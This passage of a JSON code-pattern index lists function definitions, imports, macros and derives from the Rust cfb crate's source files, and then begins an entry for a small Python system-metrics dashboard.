          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn drop(&mut self) {",
          "fn flush_changes(&self, stream: &mut Stream<F>) -> io::Result<()>;",
          "fn flush_changes(&self, stream: &mut Stream<F>) -> io::Result<()> {",
          "fn zero_padded_fat() -> io::Result<()> {"
        ],
        "struct_defs": [
          "struct FlushBuffer;"
        ],
        "impl_blocks": [],
        "uses": [
          "use crate::internal::consts::{self, NO_STREAM};",
          "use crate::internal::{",
          "use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};",
          "use fnv::FnvHashSet;",
          "use std::fs;",
          "use std::io::{self, BufRead, Read, Seek, SeekFrom, Write};",
          "use std::mem::size_of;",
          "use std::path::{Path, PathBuf};",
          "use uuid::Uuid;",
          "use super::CompoundFile;",
          "use crate::internal::{consts, DirEntry, Header, Version};",
          "use byteorder::{LittleEndian, WriteBytesExt};",
          "use std::io::{self, Cursor};",
          "use std::mem::size_of;"
        ],
        "macros": [
          "None => not_found!(\"No such object: {:?}\", path),",
          "None => not_found!(\"No such stream: {:?}\", path),",
          "invalid_input!(\"Not a stream: {:?}\", path);",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "debug_assert_eq!(dir_entry.obj_type, ObjType::Stream);",
          "debug_assert!(sector_len >= consts::HEADER_LEN);",
          "already_exists!(",
          "already_exists!(",
          "debug_assert!(!names.is_empty());",
          "not_found!(\"Parent storage doesn't exist\");",
          "None => not_found!(\"No such storage: {:?}\", path),",
          "invalid_input!(\"Cannot remove the root storage object\");",
          "invalid_input!(\"Not a storage: {:?}\", path);",
          "debug_assert_eq!(dir_entry.obj_type, ObjType::Storage);",
          "invalid_input!(\"Storage is not empty: {:?}\", path);",
          "debug_assert!(!names.is_empty());",
          "None => not_found!(",
          "invalid_input!(",
          "already_exists!(",
          "already_exists!(",
          "debug_assert!(!names.is_empty());",
          "not_found!(\"Parent storage doesn't exist\");",
          "None => not_found!(\"No such stream: {:?}\", path),",
          "invalid_input!(\"Not a stream: {:?}\", path);",
          "debug_assert_eq!(dir_entry.child, NO_STREAM);",
          "debug_assert!(!names.is_empty());",
          "None => not_found!(",
          "None => not_found!(\"No such object: {:?}\", path),",
          "debug_assert_ne!(",
          "debug_assert_eq!(dir_entry.obj_type, ObjType::Stream);",
          "debug_assert!(buf_offset_from_start <= old_stream_len);",
          "debug_assert_eq!(old_stream_len, 0);",
          "debug_assert_eq!(buf_offset_from_start, 0);",
          "debug_assert_eq!(chain.start_sector_id(), old_start_sector);",
          "debug_assert!(",
          "debug_assert!(new_stream_len >= consts::MINI_STREAM_CUTOFF as u64);",
          "debug_assert_eq!(chain.start_sector_id(), old_start_sector);",
          "debug_assert_eq!(dir_entry.obj_type, ObjType::Stream);",
          "debug_assert_eq!(old_stream_len, 0);",
          "debug_assert_eq!(chain.start_sector_id(), old_start_sector);",
          "debug_assert!(new_stream_len < old_stream_len);",
          "debug_assert_eq!(chain.start_sector_id(), old_start_sector);",
          "invalid_input!(",
          "invalid_input!(",
          "invalid_input!(",
          "debug_assert!(old_pos <= self.total_len);",
          "invalid_input!(",
          "invalid_input!(",
          "debug_assert!(self.buf_pos <= self.buffer.len());",
          "debug_assert!(self.buf_pos <= self.buffer.len());",
          "debug_assert_eq!("
        ],
        "derives": [],
        "error_handling": 159
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/consts.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/chain.rs",
        "function_defs": [
          "fn seek(&mut self, pos: SeekFrom) -> io::Result<u64> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::internal::{consts, Allocator, Sector, SectorInit};",
          "use std::cmp;",
          "use std::io::{self, Read, Seek, SeekFrom, Write};"
        ],
        "macros": [
          "invalid_data!(",
          "debug_assert!(offset_within_subsector <= subsector_len as u64);",
          "debug_assert_eq!(self.allocator.sector_len() % subsector_len, 0);",
          "invalid_input!(",
          "debug_assert!(self.offset_from_start <= total_len);",
          "debug_assert!(current_sector_index < self.sector_ids.len());",
          "debug_assert!(self.offset_from_start <= total_len);",
          "debug_assert_eq!(total_len, self.len());",
          "debug_assert!(current_sector_index < self.sector_ids.len());",
          "debug_assert!(self.offset_from_start <= total_len);"
        ],
        "derives": [],
        "error_handling": 13
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/version.rs",
        "function_defs": [
          "fn number_round_trip() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Version {"
        ],
        "uses": [
          "use crate::internal::consts;",
          "use super::Version;"
        ],
        "macros": [
          "/// assert_eq!(Version::V3.sector_len(), 512);",
          "/// assert_eq!(Version::V4.sector_len(), 4096);",
          "assert_eq!(Version::from_number(version.number()), Some(version));"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/color.rs",
        "function_defs": [
          "fn round_trip() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Color {"
        ],
        "uses": [
          "use crate::internal::consts;",
          "use super::Color;"
        ],
        "macros": [
          "assert_eq!(Color::from_byte(color.as_byte()), Some(color));"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/header.rs",
        "function_defs": [
          "fn make_valid_header() -> Header {",
          "fn make_valid_header_data() -> Vec<u8> {",
          "fn round_trip() {",
          "fn invalid_magic_number() {",
          "fn invalid_version() {",
          "fn invalid_byte_order_mark() {",
          "fn invalid_sector_shift() {",
          "fn invalid_mini_sector_shift() {",
          "fn invalid_mini_stream_cutoff() {",
          "fn invalid_difat_array() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Header {"
        ],
        "uses": [
          "use crate::internal::{consts, Version};",
          "use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};",
          "use std::io::{self, Read, Write};",
          "use super::Header;",
          "use crate::internal::{consts, Version};"
        ],
        "macros": [
          "invalid_data!(\"Invalid CFB file (wrong magic number)\");",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "invalid_data!(",
          "assert_eq!(header1.version, header2.version);",
          "assert_eq!(header1.num_dir_sectors, header2.num_dir_sectors);",
          "assert_eq!(header1.num_fat_sectors, header2.num_fat_sectors);",
          "assert_eq!(header1.first_dir_sector, header2.first_dir_sector);",
          "assert_eq!(header1.first_minifat_sector, header2.first_minifat_sector);",
          "assert_eq!(header1.num_minifat_sectors, header2.num_minifat_sectors);",
          "assert_eq!(header1.first_difat_sector, header2.first_difat_sector);",
          "assert_eq!(header1.num_difat_sectors, header2.num_difat_sectors);",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 47
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/time.rs",
        "function_defs": [
          "fn timestamp_from_system_time(system_time: SystemTime) -> u64 {",
          "fn duration_to_timestamp_delta(duration: Duration) -> u64 {",
          "fn timestamp_delta_to_duration(delta: u64) -> Duration {",
          "fn extreme_timestamp_delta() {",
          "fn extreme_duration() {",
          "fn unix_epoch() {",
          "fn after_unix_epoch() {",
          "fn before_unix_epoch() {",
          "fn extreme_timestamps() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::time::{Duration, SystemTime, UNIX_EPOCH};",
          "use super::{",
          "use std::time::{Duration, UNIX_EPOCH};"
        ],
        "macros": [
          "assert_eq!(duration.as_secs(), 1844674407370);",
          "assert_eq!(duration.subsec_nanos(), 955161500);",
          "assert_eq!(duration_to_timestamp_delta(duration), timestamp);",
          "assert_eq!(duration_to_timestamp_delta(duration), u64::MAX);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(min_time <= max_time);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/minichain.rs",
        "function_defs": [
          "fn seek(&mut self, pos: SeekFrom) -> io::Result<u64> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::internal::{consts, MiniAllocator};",
          "use std::io::{self, Read, Seek, SeekFrom, Write};"
        ],
        "macros": [
          "invalid_data!(",
          "debug_assert!(new_len < consts::MINI_STREAM_CUTOFF as u64);",
          "invalid_input!(",
          "debug_assert!(self.offset_from_start <= total_len);",
          "debug_assert!(current_sector_index < self.sector_ids.len());",
          "debug_assert!(self.offset_from_start <= total_len);",
          "debug_assert_eq!(total_len, self.len());",
          "debug_assert!(current_sector_index < self.sector_ids.len());",
          "debug_assert!(self.offset_from_start <= total_len);"
        ],
        "derives": [],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/path.rs",
        "function_defs": [
          "fn name_ordering() {",
          "fn short_name_is_valid() {",
          "fn long_name_is_invalid() {",
          "fn name_with_slash_is_invalid() {",
          "fn absolute_path_is_valid() {",
          "fn relative_path_is_valid() {",
          "fn path_with_parents_is_valid() {",
          "fn parent_of_root_is_invalid() {",
          "fn canonical_path_is_absolute() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::cmp::Ordering;",
          "use std::io;",
          "use std::path::{Component, Path, PathBuf};",
          "use super::{",
          "use std::cmp::Ordering;",
          "use std::path::{Path, PathBuf};"
        ],
        "macros": [
          "invalid_input!(",
          "invalid_input!(\"Object name cannot contain {} character\", chr);",
          "invalid_input!(\"Invalid path (must not have prefix)\");",
          "invalid_input!(\"Invalid path (must be within root)\");",
          "None => invalid_input!(\"Non UTF-8 path\"),",
          "assert_eq!(compare_names(\"foobar\", \"FOOBAR\"), Ordering::Equal);",
          "assert_eq!(compare_names(\"foo\", \"barfoo\"), Ordering::Less);",
          "assert_eq!(compare_names(\"Foo\", \"bar\"), Ordering::Greater);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(path_from_name_chain(&names), PathBuf::from(\"/foo/baz\"));"
        ],
        "derives": [],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/alloc.rs",
        "function_defs": [
          "fn validate(&self) -> io::Result<()> {",
          "fn allocate_sector(&mut self, init: SectorInit) -> io::Result<u32> {",
          "fn append_fat_sector(&mut self) -> io::Result<()> {",
          "fn free_sector(&mut self, sector_id: u32) -> io::Result<()> {",
          "fn set_fat(&mut self, index: u32, value: u32) -> io::Result<()> {",
          "fn make_sectors(",
          "fn make_allocator(",
          "fn fat_longer_than_file() {",
          "fn difat_sector_out_of_range() {",
          "fn difat_sector_not_marked_in_fat() {",
          "fn fat_sector_out_of_range() {",
          "fn fat_sector_not_marked_in_fat() {",
          "fn pointee_out_of_range() {",
          "fn double_pointee() {",
          "fn invalid_pointee() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::internal::{consts, Chain, Sector, SectorInit, Sectors, Version};",
          "use byteorder::{LittleEndian, WriteBytesExt};",
          "use fnv::FnvHashSet;",
          "use std::io::{self, Seek, Write};",
          "use std::mem::size_of;",
          "use super::Allocator;",
          "use crate::internal::{consts, Sectors, Version};",
          "use std::io::Cursor;"
        ],
        "macros": [
          "($e:expr) => { invalid_data!(\"Malformed FAT ({})\", $e) };",
          "invalid_data!(\"Malformed FAT ({})\", format!($fmt, $($arg)+))",
          "invalid_data!(",
          "invalid_data!(\"next_id ({}) is invalid\", next_id);",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(\"sector {} pointed to twice\", to_sector);",
          "malformed!(\"0x{:08X} is not a valid FAT entry\", to_sector);",
          "debug_assert_ne!(start_sector_id, consts::END_OF_CHAIN);",
          "debug_assert_eq!(self.fat.len(), new_fat_sector_id as usize + 1);",
          "debug_assert!(index <= self.fat.len());"
        ],
        "derives": [],
        "error_handling": 36
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/directory.rs",
        "function_defs": [
          "fn dir_entry_mut(&mut self, stream_id: u32) -> &mut DirEntry {",
          "fn validate(&self) -> io::Result<()> {",
          "fn seek_to_dir_entry(&mut self, stream_id: u32) -> io::Result<Sector<F>> {",
          "fn seek_within_dir_entry(",
          "fn allocate_dir_entry(&mut self) -> io::Result<u32> {",
          "fn free_dir_entry(&mut self, stream_id: u32) -> io::Result<()> {",
          "fn write_dir_entry(&mut self, stream_id: u32) -> io::Result<()> {",
          "fn make_directory(entries: Vec<DirEntry>) -> Directory<Cursor<Vec<u8>>> {",
          "fn no_root_entry() {",
          "fn invalid_mini_stream_len() {",
          "fn storage_is_child_of_itself() {",
          "fn root_has_wrong_type() {",
          "fn nonroot_has_wrong_type() {",
          "fn tolerate_red_root() {",
          "fn tolerate_two_red_nodes_in_a_row() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::internal::{",
          "use byteorder::{LittleEndian, WriteBytesExt};",
          "use fnv::FnvHashSet;",
          "use std::cmp::Ordering;",
          "use std::io::{self, Seek, SeekFrom, Write};",
          "use std::path::Path;",
          "use super::Directory;",
          "use crate::internal::{",
          "use std::io::Cursor;"
        ],
        "macros": [
          "($e:expr) => { invalid_data!(\"Malformed directory ({})\", $e) };",
          "invalid_data!(\"Malformed directory ({})\", format!($fmt, $($arg)+))",
          "None => not_found!(\"No such storage: {:?}\", path),",
          "invalid_input!(\"Not a storage: {:?}\", path);",
          "debug_assert!(",
          "not_found!(",
          "malformed!(\"root entry is missing\");",
          "malformed!(",
          "malformed!(\"loop in tree\");",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "debug_assert_ne!(directory_sector, consts::END_OF_CHAIN);",
          "debug_assert!(",
          "Ordering::Equal => panic!(\"internal error: insert duplicate\"),",
          "debug_assert_eq!(prev_sibling_id, parent_id);",
          "debug_assert_ne!(stream_id, consts::NO_STREAM);",
          "debug_assert!(!stream_ids.contains(&stream_id));",
          "debug_assert_eq!(self.dir_entry(stream_id).child, consts::NO_STREAM);",
          "debug_assert_eq!(pred_entry.right_sibling, consts::NO_STREAM);",
          "debug_assert_eq!(stream_ids.last(), Some(&stream_id));",
          "debug_assert_eq!(",
          "debug_assert_ne!(stream_id, consts::ROOT_STREAM_ID);"
        ],
        "derives": [],
        "error_handling": 39
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/sector.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn seek(&mut self, pos: SeekFrom) -> io::Result<u64> {",
          "fn initialize<F: Write>(self, sector: &mut Sector<F>) -> io::Result<()> {",
          "fn sector_read() {",
          "fn sector_write() {",
          "fn sector_seek() {",
          "fn sector_init() {",
          "fn partial_final_sector() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl SectorInit {"
        ],
        "uses": [
          "use crate::internal::{consts, DirEntry, Version};",
          "use byteorder::{LittleEndian, WriteBytesExt};",
          "use std::cmp;",
          "use std::io::{self, Read, Seek, SeekFrom, Write};",
          "use super::{SectorInit, Sectors};",
          "use crate::internal::{consts, DirEntry, ObjType, Version};",
          "use byteorder::{LittleEndian, ReadBytesExt};",
          "use std::io::{Cursor, Read, Seek, SeekFrom, Write};"
        ],
        "macros": [
          "debug_assert!(inner_len >= sector_len);",
          "debug_assert!(offset_within_header < consts::HEADER_LEN as u64);",
          "debug_assert!(offset_within_sector <= self.sector_len() as u64);",
          "invalid_data!(",
          "cmp::Ordering::Greater => invalid_data!(",
          "debug_assert!(self.offset_within_sector <= self.len());",
          "debug_assert!(self.offset_within_sector <= self.len());",
          "debug_assert!(start <= self.offset_within_sector);",
          "debug_assert!(start + len >= self.offset_within_sector);",
          "debug_assert!(start + len <= self.len());",
          "debug_assert!(self.offset_within_sector <= self.len());",
          "debug_assert!(self.offset_within_sector <= self.len());",
          "panic!(\"Internal error: cannot seek outside of sector\");",
          "debug_assert_eq!(sector.offset_within_sector, 0);",
          "debug_assert_eq!(sector.len() % 4, 0);",
          "debug_assert_eq!(sector.len() % 4, 0);",
          "debug_assert!(sector.len() >= 4);",
          "debug_assert_eq!(sector.len() % consts::DIR_ENTRY_LEN, 0);",
          "assert_eq!(sectors.sector_len(), 512);",
          "assert_eq!(sectors.num_sectors(), 3);",
          "assert_eq!(sector.len(), 512);",
          "assert_eq!(sector.read(&mut buffer).unwrap(), 400);",
          "assert_eq!(buffer, vec![3; 400])",
          "assert_eq!(sector.read(&mut buffer).unwrap(), 112);",
          "assert_eq!(buffer, expected_data);",
          "assert_eq!(sector.read(&mut buffer).unwrap(), 0);",
          "assert_eq!(buffer, vec![0; 400])",
          "assert_eq!(sectors.sector_len(), 512);",
          "assert_eq!(sectors.num_sectors(), 3);",
          "assert_eq!(sector.len(), 512);",
          "assert_eq!(sector.write(&vec![1; 400]).unwrap(), 400);",
          "assert_eq!(sector.write(&vec![2; 400]).unwrap(), 112);",
          "assert_eq!(sector.write(&vec![3; 400]).unwrap(), 0);",
          "assert_eq!(actual_data, expected_data);",
          "assert_eq!(data.len(), 1024);",
          "assert_eq!(sectors.sector_len(), 512);",
          "assert_eq!(sectors.num_sectors(), 2);",
          "assert_eq!(sector.seek(SeekFrom::Start(128)).unwrap(), 128);",
          "assert_eq!(buffer, vec![2; 128]);",
          "assert_eq!(sector.seek(SeekFrom::End(-128)).unwrap(), 384);",
          "assert_eq!(buffer, vec![4; 128]);",
          "assert_eq!(sector.seek(SeekFrom::Current(-256)).unwrap(), 256);",
          "assert_eq!(buffer, vec![3; 128]);",
          "assert_eq!(sectors.num_sectors(), 0);",
          "assert_eq!(buffer, vec![0; 512]);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(dir_entry.obj_type, ObjType::Unallocated);",
          "assert_eq!(dir_entry.left_sibling, consts::NO_STREAM);",
          "assert_eq!(dir_entry.right_sibling, consts::NO_STREAM);",
          "assert_eq!(dir_entry.child, consts::NO_STREAM);",
          "assert_eq!(sectors.num_sectors(), 2);",
          "assert_eq!(data, vec![0u8; 2048]);"
        ],
        "derives": [
          "#[derive(Clone, Copy)]"
        ],
        "error_handling": 44
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/direntry.rs",
        "function_defs": [
          "fn parse_valid_storage_entry_with_end_of_chain_start() {",
          "fn parse_valid_storage_entry() {",
          "fn invalid_object_type() {",
          "fn invalid_color() {",
          "fn non_null_clsid_on_stream() {",
          "fn non_null_terminated_name() {",
          "fn nonzero_storage_starting_sector_and_stream_len() {",
          "fn root_entry_with_incorrect_name() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl DirEntry {"
        ],
        "uses": [
          "use crate::internal::consts::{self, MAX_REGULAR_STREAM_ID, NO_STREAM};",
          "use crate::internal::{self, Color, ObjType, Version};",
          "use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};",
          "use std::io::{self, Read, Write};",
          "use uuid::Uuid;",
          "use super::DirEntry;",
          "use crate::internal::{consts, Color, ObjType, Version};",
          "use uuid::Uuid;"
        ],
        "macros": [
          "($e:expr) => { invalid_data!(\"Malformed directory entry ({})\", $e) };",
          "invalid_data!(\"Malformed directory entry ({})\",",
          "format!($fmt, $($arg)+))",
          "debug_assert_ne!(obj_type, ObjType::Unallocated);",
          "malformed!(\"name length too large: {}\", name_len_bytes);",
          "malformed!(\"odd name length: {}\", name_len_bytes);",
          "debug_assert!(name_len_chars < name_chars.len());",
          "Err(_) => malformed!(\"name not valid UTF-16\"),",
          "None => malformed!(\"invalid object type: {}\", obj_type_byte),",
          "None => malformed!(\"invalid color: {}\", color_byte),",
          "malformed!(\"invalid left sibling: {}\", left_sibling);",
          "malformed!(\"invalid right sibling: {}\", right_sibling);",
          "malformed!(\"non-empty stream child: {}\", child);",
          "malformed!(\"invalid child: {}\", child);",
          "debug_assert!(internal::path::validate_name(&self.name).is_ok());",
          "debug_assert!(name_utf16.len() < 32);",
          "assert_eq!(&dir_entry.name, \"Foobar\");",
          "assert_eq!(dir_entry.obj_type, ObjType::Storage);",
          "assert_eq!(dir_entry.color, Color::Black);",
          "assert_eq!(dir_entry.left_sibling, 12);",
          "assert_eq!(dir_entry.right_sibling, 34);",
          "assert_eq!(dir_entry.child, 56);",
          "assert_eq!(",
          "assert_eq!(dir_entry.state_bits, 0xdeadbeef);",
          "assert_eq!(dir_entry.creation_time, 0);",
          "assert_eq!(dir_entry.modified_time, 0);",
          "assert_eq!(dir_entry.start_sector, 0);",
          "assert_eq!(dir_entry.stream_len, 0);",
          "assert_eq!(&dir_entry.name, \"Foobar\");",
          "assert_eq!(dir_entry.obj_type, ObjType::Storage);",
          "assert_eq!(dir_entry.color, Color::Black);",
          "assert_eq!(dir_entry.left_sibling, 12);",
          "assert_eq!(dir_entry.right_sibling, 34);",
          "assert_eq!(dir_entry.child, 56);",
          "assert_eq!(",
          "assert_eq!(dir_entry.state_bits, 0xdeadbeef);",
          "assert_eq!(dir_entry.creation_time, 0);",
          "assert_eq!(dir_entry.modified_time, 0);",
          "assert_eq!(dir_entry.start_sector, 0);",
          "assert_eq!(dir_entry.stream_len, 0);",
          "assert_eq!(dir_entry.obj_type, ObjType::Stream);",
          "assert!(dir_entry.clsid.is_nil());",
          "assert_eq!(dir_entry.name, \"Foobar\");",
          "assert_eq!(dir_entry.obj_type, ObjType::Storage);",
          "assert_eq!(dir_entry.start_sector, 0);",
          "assert_eq!(dir_entry.stream_len, 0);",
          "assert_eq!(dir_entry.obj_type, ObjType::Root);",
          "assert_eq!(dir_entry.name, \"Root Entry\");"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 52
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/minialloc.rs",
        "function_defs": [
          "fn validate(&self) -> io::Result<()> {",
          "fn allocate_mini_sector(&mut self, value: u32) -> io::Result<u32> {",
          "fn append_mini_sector(&mut self) -> io::Result<()> {",
          "fn free_mini_sector(&mut self, mini_sector: u32) -> io::Result<()> {",
          "fn set_minifat(&mut self, index: u32, value: u32) -> io::Result<()> {",
          "fn make_minialloc(minifat: Vec<u32>) -> MiniAllocator<Cursor<Vec<u8>>> {",
          "fn make_minialloc_with_root_stream_len(",
          "fn root_stream_too_short() {",
          "fn pointee_out_of_range() {",
          "fn double_pointee() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::internal::{",
          "use byteorder::{LittleEndian, WriteBytesExt};",
          "use fnv::FnvHashSet;",
          "use std::io::{self, Seek, SeekFrom, Write};",
          "use std::mem::size_of;",
          "use std::path::Path;",
          "use super::MiniAllocator;",
          "use crate::internal::{",
          "use std::io::Cursor;"
        ],
        "macros": [
          "($e:expr) => { invalid_data!(\"Malformed MiniFAT ({})\", $e) };",
          "invalid_data!(\"Malformed MiniFAT ({})\", format!($fmt, $($arg)+))",
          "invalid_data!(",
          "invalid_data!(\"next_id ({}) is invalid\", next_id);",
          "malformed!(",
          "malformed!(",
          "malformed!(",
          "debug_assert!(",
          "debug_assert_ne!(start_mini_sector, consts::END_OF_CHAIN);",
          "debug_assert!(self.minifat.is_empty());",
          "debug_assert_eq!(mini_stream_len % consts::MINI_SECTOR_LEN as u64, 0);",
          "debug_assert_eq!(mini_stream_len, 0);",
          "debug_assert_eq!(mini_stream_len % consts::MINI_SECTOR_LEN as u64, 0);",
          "debug_assert!(index as usize <= self.minifat.len());",
          "debug_assert!(chain.len() >= offset + size_of::<u32>() as u64);"
        ],
        "derives": [],
        "error_handling": 28
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/entry.rs",
        "function_defs": [
          "fn join_path(parent_path: &Path, dir_entry: &DirEntry) -> PathBuf {",
          "fn stack_left_spine(&mut self, parent_path: &Path, mut current_id: u32) {",
          "fn next(&mut self) -> Option<Entry> {",
          "fn make_entry(",
          "fn make_directory() -> Vec<DirEntry> {",
          "fn paths_for_entries(entries: &[Entry]) -> Vec<&Path> {",
          "fn nonrecursive_entries_from_root() {",
          "fn nonrecursive_entries_from_storage() {",
          "fn preorder_entries_from_root() {",
          "fn preorder_entries_from_storage() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Entry {"
        ],
        "uses": [
          "use crate::internal::{self, consts, DirEntry, ObjType};",
          "use std::path::{Path, PathBuf};",
          "use std::time::SystemTime;",
          "use uuid::Uuid;",
          "use super::{Entries, EntriesOrder, Entry};",
          "use crate::internal::consts::{NO_STREAM, ROOT_DIR_NAME};",
          "use crate::internal::{DirEntry, ObjType};",
          "use std::path::{Path, PathBuf};"
        ],
        "macros": [
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone, Copy, Eq, PartialEq)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/macros.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "format!($fmt, $($arg)+)))",
          "format!($fmt, $($arg)+)))",
          "format!($fmt, $($arg)+)))",
          "format!($fmt, $($arg)+)))"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cfb-0.7.3/src/internal/objtype.rs",
        "function_defs": [
          "fn round_trip() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ObjType {"
        ],
        "uses": [
          "use crate::internal::consts;",
          "use super::ObjType;"
        ],
        "macros": [
          "assert_eq!(ObjType::from_byte(obj_type.as_byte()), Some(obj_type));"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]"
        ],
        "error_handling": 1
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard",
    "name": "dashboard",
    "languages": [
      "Python",
      "JavaScript"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Movies/Mac Mini External/Memory/Core/Legacy/docs/dashboard/MEMORY002__20251013__app.py",
        "docstrings": [],
        "function_defs": [
          "def generate_metrics():\n\"\"\"Generate current system metrics.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\nnet_io = psutil.net_io_counters(pernic=True)\nreturn {\n'cpu_percent': psutil.cpu_percent(interval=1),\n'memory_percent': mem.percent,\n'disk_percent': disk.percent,",
          "def send_metrics():\n\"\"\"SSE event generator.\"\"\"\ntry:\nwhile True:\nmetrics = generate_metrics()\nyield f\"data: {json.dumps(metrics)}\\n\\n\"\nsleep(2)  # Update every 2 seconds\nexcept GeneratorExit:\npass\n",
          "def healthz():\n\"\"\"Health check endpoint.\"\"\"\ntry:\n# Basic system checks\npsutil.cpu_percent()\npsutil.virtual_memory()\npsutil.disk_usage('/')\nreturn jsonify({\n'status': 'healthy',\n'timestamp': datetime.now().isoformat()",
